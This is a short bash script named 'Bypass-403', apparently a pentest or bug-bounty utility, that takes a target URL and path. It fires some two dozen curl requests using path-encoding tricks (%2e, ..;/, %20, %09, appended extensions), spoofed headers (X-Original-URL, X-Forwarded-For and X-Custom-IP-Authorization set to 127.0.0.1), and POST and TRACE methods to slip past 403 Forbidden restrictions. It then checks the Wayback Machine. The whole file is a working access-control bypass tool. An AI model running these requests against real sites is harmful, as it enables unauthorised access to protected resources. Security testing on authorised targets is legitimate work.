#! /bin/bash

# Check if $3 is --ua-chrome and set USER_AGENT_HEADERS
if [ "$3" == "--ua-chrome" ]; then
    USER_AGENT_HEADERS='-H "User-Agent: chrome"'
else
    USER_AGENT_HEADERS=""
fi




figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2}" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/%2e/${2}" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/. $USER_AGENT_HEADERS
echo "  --> ${1}/${2}/." $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2// $USER_AGENT_HEADERS
echo "  --> ${1}//${2}//" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./ $USER_AGENT_HEADERS
echo "  --> ${1}/./${2}/./" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -H X-Original-URL: ${2}" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1 $USER_AGENT_HEADERS
echo "  --> ${1} -H X-rewrite-url: ${2}" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20 $USER_AGENT_HEADERS
echo "  --> ${1}/${2}%20" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09 $USER_AGENT_HEADERS
echo "  --> ${1}/${2}%09" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2? $USER_AGENT_HEADERS
echo "  --> ${1}/${2}?" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html $USER_AGENT_HEADERS
echo "  --> ${1}/${2}.html" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything $USER_AGENT_HEADERS
echo "  --> ${1}/${2}/?anything" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2# $USER_AGENT_HEADERS
echo "  --> ${1}/${2}#" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -H Content-Length:0 -X POST" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/* $USER_AGENT_HEADERS
echo "  --> ${1}/${2}/*" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php $USER_AGENT_HEADERS
echo "  --> ${1}/${2}.php" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json $USER_AGENT_HEADERS
echo "  --> ${1}/${2}.json" $USER_AGENT_HEADERS
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2}  -X TRACE" $USER_AGENT_HEADERS
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1" $USER_AGENT_HEADERS
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/" $USER_AGENT_HEADERS
echo "  --> ${1}/${2}..;/" $USER_AGENT_HEADERS
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/" $USER_AGENT_HEADERS
echo "  --> ${1}/${2};/" $USER_AGENT_HEADERS
#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -X TRACE" $USER_AGENT_HEADERS
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2 $USER_AGENT_HEADERS
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1" $USER_AGENT_HEADERS
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
